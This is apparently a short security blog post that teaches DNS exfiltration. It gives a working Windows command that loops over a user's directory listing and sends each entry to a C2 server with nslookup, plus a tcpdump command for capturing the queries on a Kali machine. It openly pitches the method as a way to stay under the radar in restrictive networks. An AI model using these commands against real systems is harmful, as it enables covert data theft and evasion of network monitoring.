---
layout: post
title: DNS Exfiltration
---

In restrictive environments basic TCP communication to and from your C2 server can arouse suspicion or be blocked. one of the ways operators keep things below the radar is to communicate over accepted protocols like ICMP or DNS. DNS exfiltration might sound intimidating to the uninitiated but it can be dead simple. 

DNS, put broadly, matches names with IP addresses. When we query DNS we are asking "hey, DNS Server, what's the IP address for google.com?" Our DNS server responds with "Sure, let me look that up for you... 172.217.10.142."

![](https://braaaax.github.io/braaaax.github.io/images/nslookup.png)

DNS exfiltration mimics this exchange, which computers on all networks do routinely navigating to websites and shares etc.,to pass data out of the network. Instead we ask "hey, DNS Server, which is actually my C2 server, what is the IP address of DATA-TO-EXFILTRATE?"

In a typical scenario we are querying our "DNS Server" kali box from a Windows machine we can set up a simple interaction like so:

`nslookup DATA Destination-IP`

Then receive our data, DNS runs on port 53 typically, with tcpdump like so:

`tcpdump -lvi eth0 "udp port 53"`
 
`-l` line buffered

`-v` verbose

`-i` interface

`"udp port 53"` port and protocol

So let's see it in action by exfiltrating directory information from a Windows 10 box to our kali box.
We'll loop over the items in our target directory and send a DNS query for each one like so:

on Windows:

`for /f %i in ('dir /b \users\brax') do nslookup %i IP`

![](https://braaaax.github.io/braaaax.github.io/images/dns-exfiltration.png)

on kali:

`tcpdump -lvi tap0 "udp port 53" 2>/dev/null`

![](https://braaaax.github.io/braaaax.github.io/images/kali-dns-server.png)

Ugly right? But we've successfully smuggled our data! We can take a look at the output and clean it up with some simple bashisms. 

![](https://braaaax.github.io/braaaax.github.io/images/dns-exfiltration-cleanedup.png)

still not perfect, but there you have it basic DNS exfiltration.
